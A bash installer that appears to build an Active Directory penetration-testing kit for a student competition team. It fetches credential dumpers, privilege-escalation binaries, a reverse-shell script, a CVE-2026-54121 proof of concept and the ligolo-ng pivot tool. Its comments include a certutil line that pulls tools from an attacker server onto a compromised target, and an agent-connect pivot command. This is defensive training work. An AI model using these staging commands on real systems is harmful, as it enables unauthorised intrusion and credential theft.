#!/bin/bash

set -u

LOG_FILE="$USER_HOME/ad_install.log"
exec > >(tee -a "$LOG_FILE") 2>&1

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Colours, print_*, fin_msg, apt_install, pip_ensure and the pin manifest live in
# lib.sh - previously copy-pasted here and in all.sh, so fixes to one never
# reached the other.
if [ ! -f "$SCRIPT_DIR/lib.sh" ]; then
    echo "[-] lib.sh not found next to ad.sh - incomplete clone? Cannot continue."
    exit 1
fi
# shellcheck source=lib.sh
source "$SCRIPT_DIR/lib.sh"

echo -e "${GREEN}"
echo "╔═══════════════════════════════════════════════════════╗"
echo "║     PSUT VAPT Team - AD Tools Installation            ║"
echo "║     Installing Active Directory pentesting tools...   ║"
echo "╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}"

print_status "Checking sudo privileges..."
if ! sudo -v; then
    print_error "sudo access denied. run script with a sudoer please."
    exit 1
fi
print_success "Sudo privileges confirmed"

while true; do sudo -n true; sleep 60; kill -0 "$$" || exit; done 2>/dev/null &

print_status "Creating dropzone directory..."
# Was hardcoded to /home/kali/dropzone. On any VDI account NOT named 'kali' the mkdir
# fails (/home is root-owned) and so does the cd - and because this script has no
# 'set -e', every git clone below then landed in whatever directory the operator
# happened to start in, while line ~167's 'cd ~/dropzone' quietly moved the SECOND
# half of the installs to the right place. The verification at the end still checked
# $USER_HOME/dropzone, so it reported NOT FOUND for tools that had installed fine.
# This never failed in rehearsal because the practice VM's user IS 'kali'.
mkdir -p "$USER_HOME/dropzone" || { print_error "Cannot create $USER_HOME/dropzone"; exit 1; }
cd "$USER_HOME/dropzone" || { print_error "Cannot cd to $USER_HOME/dropzone"; exit 1; }
print_success "Dropzone ready at $USER_HOME/dropzone"

# Run apt non-interactively. Without this, debconf's pre-configuration step
# (dpkg-preconfigure) tries an interactive frontend; because this script pipes all
# output through tee (no usable tty), that step ERRORS and apt aborts the whole
# install line - which is exactly why neo4j + bloodhound silently failed to install
# while already-present tools still "verified". all.sh already does this; ad.sh didn't.
export DEBIAN_FRONTEND=noninteractive
print_status "Removing needrestart to avoid interactive prompts..."
sudo apt remove needrestart -y 2>/dev/null || print_warning "needrestart not installed (ok)"

print_status "Installing AD enumeration and attack tools (one-by-one)..."
# netexec is added here so nxc comes from Kali's package (with packaged deps) rather
# than a flaky pip build of aardwolf. build-essential/python3-dev/libffi-dev let any
# remaining pip source builds (e.g. aardwolf) compile instead of failing on a wheel.
apt_install \
    enum4linux impacket-scripts bloodhound.py bloodhound-ce-python docker.io bloodhound neo4j \
    certipy-ad evil-winrm responder netexec \
    build-essential python3-dev libffi-dev \
    ldap-utils krb5-user libkrb5-dev freerdp3-x11 ntpsec-ntpdate unzip
# The five packages on the last line, and why each earns its place (~1 MB total):
#  * ldap-utils     - ldapsearch. It was in smol-all.sh's AD set and NOT here, which
#                     the emergency script's own comment called "a real gap in the
#                     main build". This closes it.
#  * krb5-user      - kinit / klist / kdestroy. Every impacket and certipy workflow
#                     that passes a ccache through KRB5CCNAME needs these, and none
#                     of them were installed. apt_install runs with
#                     DEBIAN_FRONTEND=noninteractive, which matters here: krb5-user
#                     otherwise opens a debconf dialog asking for the default realm.
#  * libkrb5-dev    - the GSSAPI headers powerview.py needs to build below.
#  * freerdp3-x11   - xfreerdp3. remmina is a GUI client; this one scripts, and
#                     does pass-the-hash with /pth:. Package is freerdp3-x11 on
#                     current Kali - freerdp2-x11 no longer exists.
#  * ntpsec-ntpdate - NOTE: the plain 'ntpdate' package has been REMOVED from Kali
#                     (verified against the live index: it resolves, but with no
#                     installation candidate). ntpsec-ntpdate is the replacement and
#                     still gives you /usr/sbin/ntpdate. Clock skew against the DC
#                     is what produces KRB_AP_ERR_SKEW and kills every Kerberos
#                     attack you are about to run:  sudo ntpdate <dc-ip>

# bloodhound-ce-python closes a REAL BUG that was in this script, not a nicety.
# Kali ships the two BloodHound Python collectors as two different packages:
#     bloodhound.py        -> emits LEGACY (BloodHound <= 4.3.1) format
#     bloodhound-ce-python -> emits CE format
# This script installed apt 'bloodhound' (which is BloodHound *CE* 9.4.0) together
# with ONLY the legacy collector. Upstream is explicit that the two formats cannot
# be mixed - a legacy collection fails at ingest into CE, it does not degrade
# gracefully. So the graph path in this build was broken end-to-end and nobody had
# noticed, because nobody had run collector -> ingest on a freshly built box.
# Both are installed now because we deliberately run BOTH viewers; see the block
# below for which collector feeds which.

# Database setup - IMPORTANT, verified live on Kali:
#  * Kali's 'bloodhound' is BloodHound CE 9.4.0. It runs its OWN database stack and
#    is set up/launched via bloodhound-setup / bloodhound-start (prints its own admin
#    creds). It does NOT use the system neo4j with a password we set.
#  * Kali's 'neo4j' package ships ONLY /usr/bin/neo4j - there is NO systemd unit, NO
#    neo4j-admin and NO cypher-shell, so the password CANNOT be set non-interactively,
#    and auto-starting it can clash on 7474/7687 with BloodHound CE.
# So we do NOT auto-start/pw-set neo4j (it would fail or conflict); we configure the
# harmless listen address and document the one command each path actually needs.
print_status "Configuring system Neo4j listen address (harmless if unused)..."
if [ -f "/etc/neo4j/neo4j.conf" ]; then
    sudo sed -i 's/#dbms.default_listen_address=0.0.0.0/dbms.default_listen_address=0.0.0.0/' /etc/neo4j/neo4j.conf
    print_success "Neo4j listen address configured"
fi
print_status "Database launch is one manual command (by design - avoids port clashes):"
print_status "  BloodHound CE : sudo bloodhound-setup   (first run, PRINTS admin creds)  then  sudo bloodhound-start"
print_status "  Raw neo4j     : sudo neo4j start         (default neo4j/neo4j; browser forces a new pw on first login)"

# TWO GRAPH STACKS, ON PURPOSE. Get this wrong and the ingest fails outright.
#
#   LEGACY  BloodHound 4.3.1 on the Windows box (installed by windows.ps1)
#           fed by:  bloodhound-python          (apt 'bloodhound.py')
#                    ~/dropzone/windows/legacy/SharpHound.exe   (v1.1.x)
#
#   CE      BloodHound CE 9.4.0 here on Kali   (sudo bloodhound-start)
#           fed by:  bloodhound-ce-python
#                    ~/dropzone/windows/ce/SharpHound.exe       (v2.x)
#                    azurehound                                 (from all.sh)
#
# WHY BOTH, rather than picking one:
#  * The Windows box is the team's offline graph viewer and it CANNOT run CE. CE is
#    a Docker Compose stack whose only Windows install path is Docker Desktop, and
#    Docker Desktop is unsupported on Windows Server - any edition. So a viewer on
#    that box has to be legacy.
#  * CE cannot be dropped from Kali either: AzureHound v3 emits CE format only, and
#    the cloud -> on-prem path landing in one graph is the entire reason AzureHound
#    is in all.sh. Legacy 4.3.1 cannot ingest it.
# Hence: legacy for the Windows viewer, CE for Kali and anything Azure.
print_warning "BloodHound: legacy on Windows, CE here. Do NOT mix collections -"
print_warning "  legacy collector -> BloodHound 4.3.1 (Windows)   [bloodhound-python, SharpHound 1.x]"
print_warning "  CE collector     -> BloodHound CE here           [bloodhound-ce-python, SharpHound 2.x, azurehound]"
print_warning "  Mixing them fails at ingest. Collectors are split into windows/legacy and windows/ce."
fin_msg 'Database guidance'



print_status "Cloning Ghostpack compiled binaries..."
if clone_pinned Ghostpack-CompiledBinaries \
        https://github.com/r3motecontrol/Ghostpack-CompiledBinaries \
        "$USER_HOME/dropzone/Ghostpack-CompiledBinaries"; then
    bin_count=$(find "$USER_HOME/dropzone/Ghostpack-CompiledBinaries" -name "*.exe" | wc -l)
    print_success "Ghostpack: $bin_count executables"
    fin_msg 'Ghostpack Compiled Binaries'
fi

print_status "Installing SharpEfsPotato (requires mono for building)..."
if ! command -v mono &> /dev/null; then
    print_status "Installing mono for C# compilation..."
    sudo env DEBIAN_FRONTEND=noninteractive apt-get install -y mono-complete mono-devel
fi

if [ ! -d "$USER_HOME/dropzone/SharpEfsPotato" ]; then
    if clone_pinned SharpEfsPotato https://github.com/bugch3ck/SharpEfsPotato \
            "$USER_HOME/dropzone/SharpEfsPotato"; then
        cd "$USER_HOME/dropzone/SharpEfsPotato" || print_warning "cd SharpEfsPotato failed - skipping build"
        # '[ -f "*.csproj" ]' was a QUOTED glob: test never expands it, so it looked for
        # a file literally named '*.csproj' and could never match. Dead branch.
        if [ -f "SharpEfsPotato.sln" ] || compgen -G "*.csproj" >/dev/null 2>&1; then
            print_status "Building SharpEfsPotato with mono..."
            if msbuild SharpEfsPotato.sln 2>/dev/null || xbuild SharpEfsPotato.sln 2>/dev/null; then
                print_success "SharpEfsPotato built successfully"
            else
                print_warning "SharpEfsPotato build failed, check $USER_HOME/dropzone/SharpEfsPotato for manual build"
            fi
        fi
        cd "$USER_HOME/dropzone" || exit 1
        fin_msg 'SharpEfsPotato'
    else
        print_warning "SharpEfsPotato clone failed"
    fi
else
    print_success "SharpEfsPotato already exists"
fi

print_status "Installing NetExec (nxc)..."
if command -v nxc &> /dev/null || command -v netexec &> /dev/null; then
    # Provided by the apt 'netexec' package above (packaged deps, no aardwolf build).
    print_success "NetExec present: $(nxc --version 2>&1 | head -n1 || echo installed)"
    fin_msg 'NetExec (nxc)'
else
    print_warning "apt netexec unavailable - falling back to pipx build..."
    if ! command -v pipx &> /dev/null; then
        pip install --user pipx --break-system-packages
        python3 -m pipx ensurepath
    fi
    if pipx install git+https://github.com/Pennyw0rth/NetExec; then
        print_success "NetExec installed via pipx"
        fin_msg 'NetExec (nxc)'
    else
        print_warning "NetExec install failed - check build-essential/python3-dev are present"
    fi
fi

print_status "Verifying Certipy (installed via apt 'certipy-ad' above)..."
# Dedup: previously installed 3 ways (apt + git clone + pip). Keep only the apt
# package; just confirm the command is present here.
if command -v certipy-ad &> /dev/null || command -v certipy &> /dev/null; then
    print_success "Certipy present: $(certipy-ad --version 2>&1 | head -n1 || certipy --version 2>&1 | head -n1 || echo installed)"
    fin_msg 'Certipy'
else
    print_warning "certipy not found - apt 'certipy-ad' may have failed; see APT summary at end"
fi

print_status "Installing PKINITtools..."
clone_pinned PKINITtools https://github.com/dirkjanm/PKINITtools "$USER_HOME/dropzone/PKINITtools"
pip_ensure minikerberos minikerberos   # usually already present from all.sh; skipped if so
fin_msg 'PKINITtools'

print_status "Installing bloodyAD..."
clone_pinned bloodyAD https://github.com/CravateRouge/bloodyAD.git "$USER_HOME/dropzone/bloodyAD"
if [ -d "$USER_HOME/dropzone/bloodyAD" ]; then
    cd "$USER_HOME/dropzone/bloodyAD" || exit 1
    if pip install -r requirements.txt --break-system-packages; then
        print_success "bloodyAD dependencies installed"
    else
        print_warning "bloodyAD dependencies installation failed"
    fi
    cd "$USER_HOME/dropzone" || exit 1
    fin_msg 'bloodyAD'
fi

print_status "Installing PowerView.py..."
# The Python port of PowerSploit's PowerView - domain enumeration in the shape the
# AD playbooks are written in. Kali packages python3-pywerview, which is a DIFFERENT
# and much older rewrite; this is aniqfakhrul's. It builds a gssapi extension, which
# is why libkrb5-dev is in the apt list above - without those headers pip fails on
# the gssapi wheel.
pip_ensure powerview powerview
fin_msg 'PowerView.py'

print_status "Installing pywhisker (Shadow Credentials)..."
# Completes a chain that was otherwise missing its first link: certipy-ad and
# PKINITtools are both already installed, but nothing here could WRITE
# msDS-KeyCredentialLink in the first place.
# Installed from the official ShutdownRepo repository rather than the PyPI package
# of the same name, which is published by a third party and self-describes as
# "Unofficial". For a tool that handles domain credentials, prefer upstream.
if clone_pinned pywhisker https://github.com/ShutdownRepo/pywhisker "$USER_HOME/dropzone/pywhisker"; then
    cd "$USER_HOME/dropzone/pywhisker" || exit 1
    if pip install . --break-system-packages; then
        print_success "pywhisker installed (command: pywhisker)"
    elif pip install -r requirements.txt --break-system-packages; then
        print_warning "pywhisker package install failed; dependencies are in, run it from the clone:"
        print_warning "  python3 $USER_HOME/dropzone/pywhisker/pywhisker/pywhisker.py -h"
    else
        print_warning "pywhisker install failed"
    fi
    cd "$USER_HOME/dropzone" || exit 1
    fin_msg 'pywhisker'
fi

print_status "Installing targetedKerberoast..."
# Kerberoasting against accounts that have no SPN: add one, roast it, remove it.
# A single script, so it runs from the clone - there is nothing to install.
if clone_pinned targetedKerberoast https://github.com/ShutdownRepo/targetedKerberoast \
        "$USER_HOME/dropzone/targetedKerberoast"; then
    chmod +x "$USER_HOME/dropzone/targetedKerberoast/targetedKerberoast.py" 2>/dev/null
    if [ -f "$USER_HOME/dropzone/targetedKerberoast/requirements.txt" ]; then
        pip install -r "$USER_HOME/dropzone/targetedKerberoast/requirements.txt" --break-system-packages \
            && print_success "targetedKerberoast dependencies installed" \
            || print_warning "targetedKerberoast dependencies failed - it may not run"
    fi
    print_status "Run it with: python3 ~/dropzone/targetedKerberoast/targetedKerberoast.py -h"
    fin_msg 'targetedKerberoast'
fi

print_status "Installing Kerbrute..."
if fetch_pinned kerbrute /usr/local/bin/kerbrute sudo && sudo chmod +x /usr/local/bin/kerbrute; then
    kerbrute_version=$(kerbrute version 2>&1 || echo "installed")
    print_success "Kerbrute installed: $kerbrute_version"
    fin_msg 'Kerbrute'
else
    print_warning "Kerbrute installation failed"
fi

print_status "Installing windapsearch..."
if fetch_pinned windapsearch /usr/local/bin/windapsearch sudo && sudo chmod +x /usr/local/bin/windapsearch; then
    print_success "windapsearch installed to /usr/local/bin/windapsearch"
    fin_msg 'windapsearch'
else
    print_warning "windapsearch installation failed"
fi

print_status "Verifying Impacket (installed via apt 'impacket-scripts' above)..."
# Dedup: was installed via both apt AND pipx. Keep the apt package; confirm here.
if command -v impacket-secretsdump &> /dev/null || python3 -c "import impacket" &> /dev/null; then
    print_success "Impacket present"
    fin_msg 'Impacket'
else
    print_warning "Impacket not found - apt 'impacket-scripts' may have failed; see APT summary at end"
fi

# print_status "Installing Sliver C2 Framework..."
# if ! command -v sliver &> /dev/null; then
#     if curl -s https://sliver.sh/install | sudo bash; then
#         print_success "Sliver installed"

#         if [ -f "/root/sliver-server" ]; then
#             sudo cp /root/sliver-server /usr/bin/ 2>/dev/null || print_warning "Could not copy sliver-server from /root"
#         fi

#         if sudo systemctl enable sliver 2>/dev/null && sudo systemctl start sliver 2>/dev/null; then
#             print_success "Sliver service enabled and started"
#         else
#             print_warning "Sliver service configuration failed (may not have systemd unit)"
#         fi
#         fin_msg 'Sliver C2'
#     else
#         print_warning "Sliver installation failed"
#     fi
# else
#     print_success "Sliver already installed"
#     sliver_version=$(sliver version 2>&1 | head -n1 || echo "installed")
#     print_status "Sliver version: $sliver_version"
# fi

# ---------------------------------------------------------------------------
# LINUX-SIDE AD TOOLS THAT WERE MISSING
# ---------------------------------------------------------------------------
# These three were only ever available to this team inside the previous roster's
# 72 MB AD_Tools.zip, which is not in this repo. They run on Kali.
cd "$USER_HOME/dropzone" || exit 1

print_status "Installing krbrelayx (coercion + unconstrained-delegation relay)..."
# The coercion/relay half of the AD toolkit was entirely absent: PKINITtools and
# certipy cover certificates, nothing covered printerbug/PetitPotam-style coercion
# or relaying to LDAP. printerbug.py, addspn.py and dnstool.py all live here.
if clone_pinned krbrelayx https://github.com/dirkjanm/krbrelayx "$USER_HOME/dropzone/krbrelayx"; then
    chmod +x "$USER_HOME/dropzone/krbrelayx"/*.py 2>/dev/null
    print_status "  coerce:  python3 ~/dropzone/krbrelayx/printerbug.py -h"
    print_status "  relay:   python3 ~/dropzone/krbrelayx/krbrelayx.py -h"
    fin_msg 'krbrelayx'
fi

print_status "Installing gMSADumper (group-managed service account passwords)..."
if clone_pinned gMSADumper https://github.com/micahvandeusen/gMSADumper "$USER_HOME/dropzone/gMSADumper"; then
    print_status "  python3 ~/dropzone/gMSADumper/gMSADumper.py -u <user> -p <pass> -d <domain>"
    fin_msg 'gMSADumper'
fi

print_status "Installing KeyTabExtract (NTLM hashes out of a captured .keytab)..."
if clone_pinned KeyTabExtract https://github.com/sosdave/KeyTabExtract "$USER_HOME/dropzone/KeyTabExtract"; then
    fin_msg 'KeyTabExtract'
fi

# ---------------------------------------------------------------------------
# CERTIGHOST - CVE-2026-54121  (AD CS, patched 2026-07-14, public PoC 2026-07-24)
# ---------------------------------------------------------------------------
# A low-privileged authenticated domain user makes the CA chase an attacker-
# controlled host for identity data, then issues a certificate under a DOMAIN
# CONTROLLER's identity -> PKINIT -> tickets as a DC -> DCSync / krbtgt.
# CVSS 8.8. Patched in Microsoft's July 2026 updates.
#
# WHY IT IS HERE: the theme is an "aging" estate, the environment is built months
# before we see it, and a July 2026 patch is exactly the one an October 2026 build
# misses. Precedent: the CPTC 11 client-email library shipped pre-written
# notifications for React2shell and MongoBleed, so topical CVEs do get planted.
#
# IT IS CLONED, NOT COMMITTED. An unvetted 2026 exploit script does not belong in
# a public repo we are liable for and may be asked to demonstrate (rules §4.3).
# It lands on the box the same way PKINITtools and bloodyAD do.
#
# ESTABLISH EXPOSURE READ-ONLY FIRST - certipy is already installed:
#     certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable -stdout
# This is a full domain-compromise primitive. Confirm the finding, write it up,
# and only fire the PoC deliberately. ***READ THIS SCRIPT BEFORE THE FREEZE.***
print_status "Installing Certighost PoC (CVE-2026-54121)..."
if clone_pinned certighost https://github.com/aniqfakhrul/CVE-2026-54121 \
        "$USER_HOME/dropzone/certighost"; then
    if [ -f "$USER_HOME/dropzone/certighost/requirements.txt" ]; then
        pip install -r "$USER_HOME/dropzone/certighost/requirements.txt" --break-system-packages \
            && print_success "certighost dependencies installed" \
            || print_warning "certighost dependencies failed - it may not run"
    fi
    print_warning "UNVETTED third-party exploit. Read it before the repo freeze."
    print_status "  Enumerate first, read-only:  certipy find ... -vulnerable -stdout"
    fin_msg 'Certighost (CVE-2026-54121)'
fi

# ---------------------------------------------------------------------------
# WINDOWS PAYLOAD SET  ->  ~/dropzone/windows/
# ---------------------------------------------------------------------------
# These do not run on this box and they do not run on our Windows box either.
# They are UPLOADED to compromised Windows targets, served off Kali:
#     kali$   cd ~/dropzone/windows && python3 -m http.server 9999
#     target> certutil -urlcache -split -f http://<kali>:9999/Rubeus.exe rb.exe
# The directory is deliberately a FLAT http root so the certutil/iwr line is short
# under pressure; only the two SharpHound generations are kept apart, because
# grabbing the wrong one costs you an ingest.
#
# This replaces the previous roster's checked-in AD_Tools.zip: the same tool set,
# minus the duplicates of things the build already pins, minus a leftover Kerberos
# ccache and krbrelayx hash file that should never have been in a public repo, and
# minus the script-block-logging bypass - which buys nothing when no blue team is
# scoring us and contradicts the engagement-evidence layer this repo is built on.
WINDIR="$USER_HOME/dropzone/windows"
mkdir -p "$WINDIR/legacy" "$WINDIR/ce" || exit 1
print_status "Building the Windows payload set in $WINDIR ..."

# --- single-file payloads --------------------------------------------------
fetch_pinned printspoofer64 "$WINDIR/PrintSpoofer64.exe"
fetch_pinned godpotato      "$WINDIR/GodPotato-NET4.exe"
fetch_pinned juicypotato    "$WINDIR/JuicyPotato.exe"
fetch_pinned semanagevolume "$WINDIR/SeManageVolumeExploit.exe"
fetch_pinned lazagne        "$WINDIR/LaZagne.exe"
fetch_pinned adpeas         "$WINDIR/adPEAS.ps1"
fetch_pinned powerview_ps1  "$WINDIR/PowerView.ps1"
fetch_pinned powermad       "$WINDIR/Powermad.ps1"
fetch_pinned invoke_runascs "$WINDIR/Invoke-RunasCs.ps1"
fetch_pinned sessiongopher  "$WINDIR/SessionGopher.ps1"
fetch_pinned invoke_psh_tcp "$WINDIR/Invoke-PowerShellTcp.ps1"

# --- archives: fetch, unpack, keep only what gets uploaded -----------------
# mimikatz ships 32- and 64-bit plus a driver; we only ever upload x64.
if fetch_pinned mimikatz "$WINDIR/mimikatz_trunk.zip"; then
    if unzip -o -q -j "$WINDIR/mimikatz_trunk.zip" 'x64/mimikatz.exe' -d "$WINDIR" 2>/dev/null; then
        print_success "mimikatz.exe extracted"
        rm -f "$WINDIR/mimikatz_trunk.zip"
    else
        print_warning "could not extract x64/mimikatz.exe - zip left in place to unpack by hand"
    fi
fi

if fetch_pinned accesschk "$WINDIR/AccessChk.zip"; then
    unzip -o -q -j "$WINDIR/AccessChk.zip" 'accesschk64.exe' -d "$WINDIR" 2>/dev/null \
        && { print_success "accesschk64.exe extracted"; rm -f "$WINDIR/AccessChk.zip"; } \
        || print_warning "AccessChk.zip left in place - unpack by hand"
fi

# PSTools stays a directory: PsExec is the headline but PsLoggedon/PsService/
# PsLogList all get used, and Microsoft ships them as one archive.
if fetch_pinned pstools "$WINDIR/PSTools.zip"; then
    if unzip -o -q "$WINDIR/PSTools.zip" -d "$WINDIR/pstools" 2>/dev/null; then
        print_success "PSTools extracted -> $WINDIR/pstools/"
        rm -f "$WINDIR/PSTools.zip"
    else
        print_warning "PSTools.zip left in place - unpack by hand"
    fi
fi

# --- the two SharpHounds, kept apart. See the manifest note in lib.sh. -----
# 1.x -> LEGACY format -> BloodHound 4.3.1 on the Windows box
# 2.x -> CE format     -> BloodHound CE on this box
if fetch_pinned sharphound_legacy "$WINDIR/legacy/sharphound-legacy.zip"; then
    unzip -o -q "$WINDIR/legacy/sharphound-legacy.zip" -d "$WINDIR/legacy" 2>/dev/null \
        && { print_success "SharpHound 1.1.1 (LEGACY format) -> $WINDIR/legacy/"
             rm -f "$WINDIR/legacy/sharphound-legacy.zip"; } \
        || print_warning "SharpHound legacy zip left in place"
fi
if fetch_pinned sharphound_ce "$WINDIR/ce/sharphound-ce.zip"; then
    unzip -o -q "$WINDIR/ce/sharphound-ce.zip" -d "$WINDIR/ce" 2>/dev/null \
        && { print_success "SharpHound 2.x (CE format) -> $WINDIR/ce/"
             rm -f "$WINDIR/ce/sharphound-ce.zip"; } \
        || print_warning "SharpHound CE zip left in place"
fi

# --- PowerUpSQL: MSSQL enumeration and privesc from a domain foothold ------
# A module, not a single file, so it is cloned rather than fetched. MSSQL is a
# named target shape in the vuln catalog and nothing in the build covered it.
clone_pinned PowerUpSQL https://github.com/NetSPI/PowerUpSQL "$WINDIR/PowerUpSQL"

# --- CVE-2023-29360: MSKSSRV.SYS local privilege escalation ----------------
# Source only - there is no release binary, so this needs building on a Windows
# box with the VS build tools (extras/vsbuildtools.ps1 in the old repo does that).
# Cloned so the source is ON the box; building it is a prep-time task, not an
# engagement-day one.
if clone_pinned cve_2023_29360 https://github.com/Nero22k/cve-2023-29360 \
        "$WINDIR/cve-2023-29360-src"; then
    print_warning "CVE-2023-29360 is SOURCE ONLY - build it during prep, not on the day."
fi

fin_msg 'Windows payload set'

# ---------------------------------------------------------------------------
# ligolo-ng - the pivot the build did not have
# ---------------------------------------------------------------------------
# chisel/sshuttle/proxychains were the whole pivoting story. ligolo-ng gives a
# routed TUN interface instead of a SOCKS proxy, which is what the AD tooling that
# misbehaves under proxychains actually needs. Proxy here, agent on the target.
print_status "Installing ligolo-ng (proxy here, agents into the payload set)..."
if ! command -v ligolo-proxy &>/dev/null; then
    if fetch_pinned ligolo_proxy "$USER_HOME/dropzone/ligolo-proxy.tar.gz"; then
        if tar -xzf "$USER_HOME/dropzone/ligolo-proxy.tar.gz" -C "$USER_HOME/dropzone" proxy 2>/dev/null; then
            sudo install -m 0755 "$USER_HOME/dropzone/proxy" /usr/local/bin/ligolo-proxy \
                && print_success "ligolo-proxy -> /usr/local/bin/ligolo-proxy"
            rm -f "$USER_HOME/dropzone/proxy" "$USER_HOME/dropzone/ligolo-proxy.tar.gz"
        else
            print_warning "ligolo proxy tarball did not contain 'proxy' - unpack by hand"
        fi
    fi
else
    print_success "ligolo-proxy already installed"
fi
if fetch_pinned ligolo_agent_win "$WINDIR/ligolo-agent-windows.zip"; then
    unzip -o -q -j "$WINDIR/ligolo-agent-windows.zip" 'agent.exe' -d "$WINDIR" 2>/dev/null \
        && { print_success "ligolo agent.exe -> payload set"; rm -f "$WINDIR/ligolo-agent-windows.zip"; } \
        || print_warning "ligolo windows agent zip left in place"
fi
if fetch_pinned ligolo_agent_lin "$USER_HOME/dropzone/ligolo-agent-linux.tar.gz"; then
    tar -xzf "$USER_HOME/dropzone/ligolo-agent-linux.tar.gz" -C "$USER_HOME/dropzone" agent 2>/dev/null \
        && { mv -f "$USER_HOME/dropzone/agent" "$USER_HOME/dropzone/ligolo-agent-linux"
             chmod +x "$USER_HOME/dropzone/ligolo-agent-linux"
             print_success "ligolo linux agent -> ~/dropzone/ligolo-agent-linux"
             rm -f "$USER_HOME/dropzone/ligolo-agent-linux.tar.gz"; } \
        || print_warning "ligolo linux agent tarball left in place"
fi
print_status "Usage: ligolo-proxy -selfcert  then run agent.exe -connect <kali>:11601 on target"
fin_msg 'ligolo-ng'

print_status "Installing additional AD Python tools..."
pip_ensure pypykatz pypykatz     # usually already from all.sh; skipped if present
# aardwolf has C/build deps - build-essential/python3-dev/libffi-dev were installed
# above so the wheel builds instead of failing. nxc no longer depends on this pip
# build (it comes from the apt 'netexec' package), so a failure here is non-fatal.
pip_ensure aardwolf aardwolf

echo -e "\n${GREEN}"
echo "╔═══════════════════════════════════════════════════════╗"
echo "║     AD Tools Installation Complete!                   ║"
echo "╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}\n"

print_success "Active Directory tools installed!"
print_success "Tools located at: ~/dropzone"
print_success "Log file: $LOG_FILE"

echo ""
print_status "Running AD tools verification..."
echo ""

AD_PASS=0
AD_FAIL=0

# Counters use VAR=$((VAR+1)), never ((VAR++)): post-increment returns the OLD value,
# so at 0 it evaluates to exit status 1 and any '&& ... || ...' chain runs BOTH branches.
# --- verification helpers --------------------------------------------------
# Same contract as all.sh: RUN the tool, do not just locate it. 'command -v'
# passes for a binary that cannot execute - wrong arch, missing lib, half-built
# package - which is exactly the failure mode a rebuilt box hits.
# NOTE: these helpers are duplicated from all.sh. That duplication is a known
# problem (see TOOLS.md / the lib.sh note); fix it in one place when it moves.
#
# _ad_check <desc> <command> [pattern]
#   no pattern -> must exit 0.   pattern -> exit status ignored, output must match.
_ad_check() {
    local desc=$1 cmd=$2 pat=${3:-} out rc
    out=$(timeout 120 bash -c "$cmd" 2>&1); rc=$?
    if [ "$rc" -eq 124 ]; then
        print_warning "$desc TIMED OUT during verification"
        AD_FAIL=$((AD_FAIL+1)); return 0
    fi
    if [ -n "$pat" ]; then
        if printf '%s' "$out" | grep -qaiE "$pat"; then
            print_success "$desc verified"; AD_PASS=$((AD_PASS+1))
        else
            print_error "$desc ran but output did not match /$pat/ - suspect"
            AD_FAIL=$((AD_FAIL+1))
        fi
        return 0
    fi
    if [ "$rc" -eq 0 ]; then
        print_success "$desc verified"; AD_PASS=$((AD_PASS+1))
    else
        print_error "$desc is installed but FAILED to run (exit $rc)"
        AD_FAIL=$((AD_FAIL+1))
    fi
    return 0
}

verify_tool() {
    local tool=$1
    if ! command -v "$tool" &>/dev/null; then
        print_error "$tool NOT found"
        AD_FAIL=$((AD_FAIL+1)); return 0
    fi
    _ad_check "$tool" "${2:-$tool --version}" "${3:-}"
}

verify_cmd() { _ad_check "$1" "$2" "${3:-}"; }

verify_file() {
    local file=$1 desc=$2
    if [ -e "$file" ]; then
        print_success "$desc verified"; AD_PASS=$((AD_PASS+1))
    else
        print_error "$desc NOT found"; AD_FAIL=$((AD_FAIL+1))
    fi
}

# A cloned repo that exists but is EMPTY (interrupted clone) used to pass.
verify_repo() {
    local dir=$1 desc=$2 n
    if [ ! -d "$dir" ]; then
        print_error "$desc NOT found"; AD_FAIL=$((AD_FAIL+1)); return 0
    fi
    n=$(find "$dir" -type f 2>/dev/null | wc -l)
    if [ "$n" -lt 2 ]; then
        print_error "$desc is present but nearly empty ($n files) - interrupted clone"
        AD_FAIL=$((AD_FAIL+1))
    else
        print_success "$desc verified ($n files)"; AD_PASS=$((AD_PASS+1))
    fi
    return 0
}

# $1 = python module name, $2 = human label
verify_pymod() {
    if python3 -c "import $1" &> /dev/null; then
        print_success "$2 verified"; AD_PASS=$((AD_PASS+1))
    else
        print_error "$2 NOT working"; AD_FAIL=$((AD_FAIL+1))
    fi
}

# BloodHound CE and neo4j are launchers/services, not CLIs with --version, so we
# check the package state rather than starting them (starting neo4j here would
# clash with BloodHound CE on 7474/7687 - see the install note above).
verify_tool "bloodhound" "dpkg -s bloodhound" "install ok installed"
verify_tool "neo4j"      "dpkg -s neo4j"      "install ok installed"
verify_tool "evil-winrm" "evil-winrm -h"      "evil-winrm|usage"
verify_tool "responder"  "responder -h"       "responder|usage"
verify_tool "enum4linux" "enum4linux -h"      "enum4linux|usage"
verify_tool "kerbrute"   "kerbrute version"   "[0-9]+\.[0-9]"
verify_tool "windapsearch" "windapsearch --help" "windapsearch|usage"
verify_tool "certipy-ad" "certipy-ad --version" "[0-9]"
verify_tool "netexec"    "netexec --version"  "[0-9]+\.[0-9]"
verify_tool "impacket-secretsdump" "impacket-secretsdump -h" "impacket|usage"
verify_tool "bloodhound-python"    "bloodhound-python -h"    "usage|bloodhound"

verify_tool "ldapsearch" "ldapsearch -VV" "ldapsearch|openldap"
verify_tool "klist"      "klist --version || klist -V" "kerberos|klist|[0-9]+\\.[0-9]"
# freerdp3 names its binary xfreerdp3, NOT xfreerdp - a script written against the
# old name silently does nothing on a current Kali.
verify_tool "xfreerdp3"  "xfreerdp3 --version" "freerdp|[0-9]+\\.[0-9]"
# ntpdate comes from ntpsec-ntpdate and lands in /usr/sbin, which is not on a
# normal user's PATH - so locate it rather than running it (it needs root + a
# reachable time source to do anything anyway).
verify_cmd  "ntpdate (clock skew fix)" "command -v ntpdate || ls /usr/sbin/ntpdate" "ntpdate"

verify_cmd  "PowerView.py" "powerview --help" "powerview|usage"
verify_cmd  "pywhisker" "pywhisker -h || python3 $USER_HOME/dropzone/pywhisker/pywhisker/pywhisker.py -h" "usage|pywhisker"
verify_cmd  "targetedKerberoast" "python3 $USER_HOME/dropzone/targetedKerberoast/targetedKerberoast.py -h" "usage|kerberoast"
verify_repo "$USER_HOME/dropzone/targetedKerberoast" "targetedKerberoast repo"

verify_repo "$USER_HOME/dropzone/Ghostpack-CompiledBinaries" "Ghostpack binaries"
# Rubeus is the one file we can count on being in that repo - prove it is a real
# PE and not an HTML error page or an LFS pointer stub.
